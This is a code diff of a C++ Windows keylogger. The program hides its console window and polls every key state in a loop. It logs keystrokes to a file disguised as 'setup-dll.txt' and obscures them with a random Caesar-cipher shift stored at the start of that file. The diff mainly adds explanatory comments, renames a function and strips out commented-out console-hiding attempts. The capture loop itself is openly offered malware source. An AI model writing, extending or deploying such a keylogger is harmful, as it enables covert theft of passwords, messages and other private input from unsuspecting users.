@@ -1,6 +1,5 @@
 #include <iostream>
 #include <fstream>
-//#include <cstdlib>
 #include <ctime>
 #include <conio.h>
 #include <streambuf>
@@ -19,7 +18,7 @@ void Stealth()
 }
 
 
-void encrypt_file() {
+void decrypt_file() {
 
 	int decrypt;
 	ifile.open("setup-dll.txt");
@@ -35,35 +34,19 @@ void encrypt_file() {
 int main() {
 
 	Stealth();
-	/*HWND hwnd = ::GetConsoleWindow();
-	if (hwnd != NULL)
-	{
-		HMENU hMenu = ::GetSystemMenu(hwnd, FALSE);
-		if (hMenu != NULL) DeleteMenu(hMenu, SC_CLOSE, MF_BYCOMMAND);
-	}*/
-	//FreeConsole();
-	//AttachConsole();
-	/*if (FreeConsole() == 0) {
-		MessageBox(NULL, "FreeConsole failed", "", MB_OK);
-	}*/
-	//Sleep(10);
 	srand(time(0));
-	int encrypt = rand() % 26;
-	if (encrypt == 0) {
-		encrypt = 23;
-	}
+	int encrypt = rand() % 25; // ceaser cypher encryption just for any layman not to able to read the file.
+	encrypt++; // this addition is to encounter 0 because it will disclose the whole message written.
 
 	ifile.open("setup-dll.txt", std::ofstream::out | std::ofstream::in| std::fstream::trunc);
-	ifile << encrypt;
-	ifile << " ";
-
-	int itr = 0;
+	ifile << encrypt; // placing real ceaser cypher shift in the start of the file, it can also be encrypted but this is just for understanding.
+	ifile <<" ";
 
 	while (1) {
 		for (int i = 8; i <= 255; i++) {
 			if (GetAsyncKeyState(i) == -32767) {
 
-				if (char(i) == '1') {
+				if (char(i) == '1') { // program will terminate as soon person clicks 1 , you can add your own termination condition.
 					return 0;
 				}
 
@@ -75,5 +58,4 @@ int main() {
 		}
 	}
 	ifile.close();
-	//encrypt_file();
 }
